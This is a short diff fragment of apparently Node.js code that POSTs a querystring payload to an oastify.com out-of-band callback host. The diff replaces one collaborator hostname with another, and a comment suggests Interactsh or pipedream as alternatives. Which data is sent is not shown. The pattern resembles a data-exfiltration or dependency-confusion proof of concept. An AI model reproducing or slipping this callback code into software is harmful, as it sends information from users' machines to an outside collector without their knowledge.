@@ -22,7 +22,7 @@ var postData = querystring.stringify({
 });
 
 var options = {
-    hostname: "8hqsazb9n32zxshfc7cakdpiz950tqhf.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
+    hostname: "48aaaghr2dnasvz7xa0qtdrscjik6auz.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream 
     port: 443,
     path: "/",
     method: "POST",
